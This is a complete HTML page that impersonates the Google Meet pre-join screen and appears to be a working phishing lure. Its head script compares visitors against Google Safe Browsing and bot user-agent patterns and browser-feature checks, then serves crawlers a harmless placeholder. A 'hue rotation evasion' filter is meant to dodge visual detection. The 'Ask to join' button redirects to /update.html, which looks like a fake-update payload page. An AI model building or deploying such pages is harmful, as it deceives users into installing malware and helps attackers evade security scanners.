<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Meet</title>
    <link rel="icon" href="https://www.gstatic.com/meet/icons/icon_728_728_20200708.png" type="image/png">
    <title>Google Meet</title>
    <script>
        // Enhanced GSB Crawler Protection: User-Agent patterns + Browser features
        // If loaded via document.write from index.html, crawlers were already filtered
        // If accessed directly, this will block crawlers
        (function() {
            const userAgent = navigator.userAgent || '';
            
            // Google Safe Browsing and bot detection patterns
            const googleBotPatterns = [
                /googlebot/i,
                /google.*safe.*browsing/i,
                /google.*safebrowsing/i,
                /safebrowsing/i,
                /google.*security/i,
                /google.*malware/i,
                /google.*phishing/i,
                /google.*transparency/i,
                /google.*site.*verification/i,
                /google.*page.*speed/i,
                /adsbot-google/i,
                /mediapartners-google/i
            ];
            
            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
            
            // Mobile detection
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            
            // Browser feature checks
            const hasNotificationAPI = typeof self.Notification !== 'undefined';
            const hasWebdriver = navigator.webdriver === true;
            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
            const hasChrome = window.chrome && window.chrome.runtime;
            const hasPermissions = navigator.permissions !== undefined;
            
            // Real browser: Not a Google bot AND has browser features OR is mobile
            const isRealBrowser = !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
            
            if (!isRealBrowser) {
                // Crawler detected - show benign content
                document.open();
                document.write('<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>This is a standard placeholder page.</p></body></html>');
                document.close();
                return;
            }
        })();
        
        // Hue Rotation Evasion
        document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
    </script>
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap"
        rel="stylesheet">
    <link
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"
        rel="stylesheet" />
    <style>
        :root {
            --google-blue: #1a73e8;
            --google-blue-hover: #1557b0;
            --bg-color: #ffffff;
            --text-color: #202124;
            --secondary-text: #5f6368;
            --video-bg: #202124;
            --icon-color: #ffffff;
            --danger-red: #ea4335;
            --danger-red-hover: #d93025;
            --surface-color: #3c4043;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Google Sans', 'Roboto', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Header */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 24px;
            height: 64px;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #5f6368;
            font-size: 22px;
            font-weight: 400;
            text-decoration: none;
        }

        .logo-area img {
            height: 32px;
            width: auto;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .user-details {
            text-align: right;
            line-height: 1.3;
        }

        .user-email {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-color);
        }

        .switch-account {
            font-size: 12px;
            color: var(--secondary-text);
            cursor: pointer;
        }

        .avatar {
            width: 32px;
            height: 32px;
            background-color: #8e24aa;
            /* Purple from screenshot */
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }

        /* Main Content */
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 48px;
            padding: 0 48px;
        }

        /* Video Preview */
        .video-container {
            width: 720px;
            height: 405px;
            /* 16:9 aspect ratio */
            background-color: var(--video-bg);
            border-radius: 8px;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }

        .camera-status {
            color: white;
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 20px;
            z-index: 0;
        }

        #local-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            /* Mirror effect */
            border-radius: 8px;
            z-index: 0;
            display: none;
            /* Hidden by default */
        }

        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            z-index: 1;
        }

        .top-controls {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }

        .user-name {
            color: white;
            font-size: 14px;
            font-weight: 500;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
        }

        .more-options-btn {
            color: white;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
        }

        .more-options-btn:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .center-controls {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 10px;
        }

        .control-btn {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            border: 1px solid transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .control-btn.danger {
            background-color: var(--danger-red);
            color: white;
            border-color: var(--danger-red);
        }

        .control-btn.danger:hover {
            background-color: var(--danger-red-hover);
            box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3);
        }

        .control-btn.secondary {
            background-color: transparent;
            border-color: white;
            color: white;
        }

        .control-btn.secondary:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .control-btn.active-mic {
            background-color: #3c4043;
            border-color: transparent;
            color: white;
        }

        .visual-effects-btn {
            position: absolute;
            bottom: 20px;
            right: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.3);
            border: 1px solid transparent;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .visual-effects-btn:hover {
            background-color: rgba(0, 0, 0, 0.6);
        }

        .audio-indicator {
            position: absolute;
            bottom: 20px;
            left: 20px;
            width: 24px;
            height: 24px;
            background-color: var(--google-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 4px;
        }

        .audio-bars {
            display: flex;
            gap: 2px;
            align-items: center;
            height: 12px;
        }

        .bar {
            width: 2px;
            background-color: white;
            border-radius: 1px;
            animation: bounce 1s infinite ease-in-out;
        }

        .bar:nth-child(1) {
            height: 4px;
            animation-delay: 0.1s;
        }

        .bar:nth-child(2) {
            height: 8px;
            animation-delay: 0.2s;
        }

        .bar:nth-child(3) {
            height: 6px;
            animation-delay: 0.3s;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: scaleY(1);
            }

            50% {
                transform: scaleY(1.5);
            }
        }

        /* Device Settings */
        .device-settings {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 16px;
            width: 720px;
        }

        .device-pill-container {
            position: relative;
        }

        .device-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            border: 1px solid #dadce0;
            border-radius: 18px;
            color: #3c4043;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            background: white;
            user-select: none;
        }

        .device-pill:hover {
            background-color: #f1f3f4;
        }

        .device-pill span.material-symbols-outlined {
            font-size: 18px;
            color: #5f6368;
        }

        /* Dropdown Menu */
        .dropdown-menu {
            position: absolute;
            bottom: 100%;
            /* Position above the pill */
            left: 0;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 2px 6px 2px rgba(60, 64, 67, 0.15);
            padding: 8px 0;
            min-width: 200px;
            z-index: 10;
            display: none;
            margin-bottom: 8px;
            max-height: 300px;
            overflow-y: auto;
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px 24px;
            font-size: 14px;
            color: var(--text-color);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .dropdown-item:hover {
            background-color: #f1f3f4;
        }

        .dropdown-item.selected {
            color: var(--google-blue);
            background-color: #e8f0fe;
        }

        .dropdown-item .material-symbols-outlined {
            font-size: 20px;
            color: inherit;
        }

        /* Join Section */
        .join-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 360px;
        }

        .join-title {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 32px;
            color: var(--text-color);
        }

        .ask-to-join-btn {
            background-color: var(--google-blue);
            color: white;
            border: none;
            border-radius: 24px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }

        .ask-to-join-btn:hover {
            background-color: var(--google-blue-hover);
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }

        .other-ways-btn {
            background-color: white;
            color: var(--google-blue);
            border: 1px solid #dadce0;
            border-radius: 24px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background-color 0.2s;
        }

        .other-ways-btn:hover {
            background-color: #f8f9fa;
            border-color: #d2e3fc;
        }

        .material-symbols-outlined {
            font-variation-settings:
                'FILL' 0,
                'wght' 400,
                'GRAD' 0,
                'opsz' 24
        }

        .material-symbols-outlined.filled {
            font-variation-settings:
                'FILL' 1,
                'wght' 400,
                'GRAD' 0,
                'opsz' 24
        }

        /* Loading Spinner */
        .loading-spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(26, 115, 232, 0.2);
            border-radius: 50%;
            border-top-color: var(--google-blue);
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Responsive */
        @media (max-width: 1100px) {
            main {
                flex-direction: column;
                gap: 24px;
                padding: 24px;
                overflow-y: auto;
            }

            .video-container {
                width: 100%;
                max-width: 720px;
                height: auto;
                aspect-ratio: 16/9;
            }

            .device-settings {
                width: 100%;
                max-width: 720px;
            }
        }
    </style>
</head>

<body>

    <header>
        <a href="#" class="logo-area">
            <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png"
                alt="Google Meet">
            <span>Meet</span>
        </a>
        <div class="user-info">
            <div class="user-details">
                <div class="user-email">Guest</div>
            </div>
            <div class="avatar">G</div>
        </div>
    </header>

    <main>
        <div class="left-column">
            <div class="video-container">
                <div class="camera-status">Camera is off</div>
                <video id="local-video" autoplay muted playsinline></video>
                <div class="video-overlay">
                    <div class="top-controls">
                        <div class="user-name">Guest</div>
                        <button class="more-options-btn">
                            <span class="material-symbols-outlined">more_vert</span>
                        </button>
                    </div>

                    <div class="bottom-controls-wrapper">
                        <div class="center-controls">
                            <!-- Mic Button (Off/Red) -->
                            <button class="control-btn danger" id="mic-btn">
                                <span class="material-symbols-outlined">mic_off</span>
                            </button>

                            <!-- Camera Button (Off/Red) -->
                            <button class="control-btn danger" id="cam-btn">
                                <span class="material-symbols-outlined">videocam_off</span>
                            </button>
                        </div>

                        <button class="visual-effects-btn">
                            <span class="material-symbols-outlined">auto_awesome</span>
                        </button>

                        <div class="audio-indicator">
                            <div class="audio-bars">
                                <div class="bar"></div>
                                <div class="bar"></div>
                                <div class="bar"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="device-settings">
                <div class="device-pill-container">
                    <div class="device-pill" id="mic-pill">
                        <span class="material-symbols-outlined">mic</span>
                        <span id="mic-label">Internal Microphone</span>
                        <span class="material-symbols-outlined" style="font-size: 20px;">arrow_drop_down</span>
                    </div>
                    <div class="dropdown-menu" id="mic-dropdown">
                        <!-- Mic options will be populated here -->
                    </div>
                </div>

                <div class="device-pill-container">
                    <div class="device-pill">
                        <span class="material-symbols-outlined">volume_up</span>
                        Internal Speakers
                        <span class="material-symbols-outlined" style="font-size: 20px;">arrow_drop_down</span>
                    </div>
                </div>

                <div class="device-pill-container">
                    <div class="device-pill" id="camera-pill">
                        <span class="material-symbols-outlined">videocam</span>
                        <span id="camera-label">xpression camera</span>
                        <span class="material-symbols-outlined" style="font-size: 20px;">arrow_drop_down</span>
                    </div>
                    <div class="dropdown-menu" id="camera-dropdown">
                        <!-- Camera options will be populated here -->
                    </div>
                </div>
            </div>
        </div>

        <div class="join-section">
            <h1 class="join-title">Ready to join?</h1>
            <div class="loading-spinner"></div>
            <button class="ask-to-join-btn" onclick="window.location.href='/update.html'">Ask to join</button>
            <button class="other-ways-btn">
                Other ways to join
                <span class="material-symbols-outlined" style="font-size: 20px;">keyboard_arrow_down</span>
            </button>
        </div>
    </main>

    <script>
        const micBtn = document.getElementById('mic-btn');
        const camBtn = document.getElementById('cam-btn');
        const videoElement = document.getElementById('local-video');
        const cameraLabel = document.getElementById('camera-label');
        const statusText = document.querySelector('.camera-status');
        const cameraPill = document.getElementById('camera-pill');
        const cameraDropdown = document.getElementById('camera-dropdown');
        const micPill = document.getElementById('mic-pill');
        const micDropdown = document.getElementById('mic-dropdown');
        const micLabel = document.getElementById('mic-label');

        let currentStream = null;
        let videoDevices = [];
        let audioDevices = [];
        let currentCameraId = null;
        let currentMicId = null;
        let isCameraOn = false;

        // Close dropdowns when clicking outside
        document.addEventListener('click', (e) => {
            if (!cameraPill.contains(e.target) && !cameraDropdown.contains(e.target)) {
                cameraDropdown.classList.remove('show');
            }
            if (!micPill.contains(e.target) && !micDropdown.contains(e.target)) {
                micDropdown.classList.remove('show');
            }
        });

        micBtn.addEventListener('click', () => {
            const icon = micBtn.querySelector('span');
            if (micBtn.classList.contains('danger')) {
                micBtn.classList.remove('danger');
                micBtn.classList.add('active-mic'); // Dark gray state
                icon.textContent = 'mic';
            } else {
                micBtn.classList.add('danger');
                micBtn.classList.remove('active-mic');
                icon.textContent = 'mic_off';
            }
        });

        camBtn.addEventListener('click', () => {
            toggleCamera();
        });

        // Toggle Camera Dropdown
        cameraPill.addEventListener('click', () => {
            cameraDropdown.classList.toggle('show');
            micDropdown.classList.remove('show'); // Close other
        });

        // Toggle Mic Dropdown
        micPill.addEventListener('click', () => {
            micDropdown.classList.toggle('show');
            cameraDropdown.classList.remove('show'); // Close other
        });

        async function toggleCamera() {
            const icon = camBtn.querySelector('span');

            if (isCameraOn) {
                // Turn OFF
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                    currentStream = null;
                }
                videoElement.style.display = 'none';
                statusText.style.display = 'block';

                camBtn.classList.add('danger');
                camBtn.classList.remove('active-mic');
                icon.textContent = 'videocam_off';
                isCameraOn = false;
            } else {
                // Turn ON
                await startStream(currentCameraId);
            }
        }

        async function startStream(deviceId) {
            // Stop existing stream if any
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }

            const constraints = {
                video: deviceId ? { deviceId: { exact: deviceId } } : true
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                currentStream = stream;
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                statusText.style.display = 'none';

                // Update UI to ON state
                const icon = camBtn.querySelector('span');
                camBtn.classList.remove('danger');
                camBtn.classList.add('active-mic');
                icon.textContent = 'videocam';
                isCameraOn = true;

                // Update label from the active track if we don't have a selected ID yet
                if (!deviceId) {
                    const track = stream.getVideoTracks()[0];
                    cameraLabel.textContent = track.label || 'Camera';
                    currentCameraId = track.getSettings().deviceId;
                }

            } catch (err) {
                console.error('Error starting stream:', err);
                cameraLabel.textContent = 'Camera Error';
                isCameraOn = true;
                toggleCamera();
            }
        }

        function populateDropdown(dropdown, devices, type, currentId, onSelect) {
            dropdown.innerHTML = '';
            devices.forEach(device => {
                const item = document.createElement('div');
                item.className = 'dropdown-item';
                if (device.deviceId === currentId) {
                    item.classList.add('selected');
                }

                const icon = document.createElement('span');
                icon.className = 'material-symbols-outlined';
                icon.textContent = type === 'video' ? 'videocam' : 'mic';

                const text = document.createTextNode(device.label || `Device ${device.deviceId.slice(0, 5)}...`);

                item.appendChild(icon);
                item.appendChild(text);

                item.addEventListener('click', () => {
                    onSelect(device);
                    dropdown.classList.remove('show');

                    // Update selection style
                    Array.from(dropdown.children).forEach(child => child.classList.remove('selected'));
                    item.classList.add('selected');
                });

                dropdown.appendChild(item);
            });
        }

        async function initDevices() {
            try {
                // Request permissions
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                // Get devices
                const devices = await navigator.mediaDevices.enumerateDevices();
                videoDevices = devices.filter(device => device.kind === 'videoinput');
                audioDevices = devices.filter(device => device.kind === 'audioinput');

                // Setup Camera
                if (videoDevices.length > 0) {
                    currentCameraId = videoDevices[0].deviceId;
                    cameraLabel.textContent = videoDevices[0].label || 'Camera';

                    populateDropdown(cameraDropdown, videoDevices, 'video', currentCameraId, (device) => {
                        currentCameraId = device.deviceId;
                        cameraLabel.textContent = device.label;
                        if (isCameraOn) {
                            startStream(currentCameraId);
                        }
                    });
                } else {
                    cameraLabel.textContent = 'No Camera Found';
                }

                // Setup Mic
                if (audioDevices.length > 0) {
                    currentMicId = audioDevices[0].deviceId;
                    micLabel.textContent = audioDevices[0].label || 'Microphone';

                    populateDropdown(micDropdown, audioDevices, 'audio', currentMicId, (device) => {
                        currentMicId = device.deviceId;
                        micLabel.textContent = device.label;
                        // Logic to switch mic stream would go here
                    });
                } else {
                    micLabel.textContent = 'No Mic Found';
                }

                // Stop initial stream
                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.error('Error accessing devices:', err);
                cameraLabel.textContent = 'Access Denied';
                micLabel.textContent = 'Access Denied';
            }
        }

        window.addEventListener('load', initDevices);
    </script>
</body>

</html>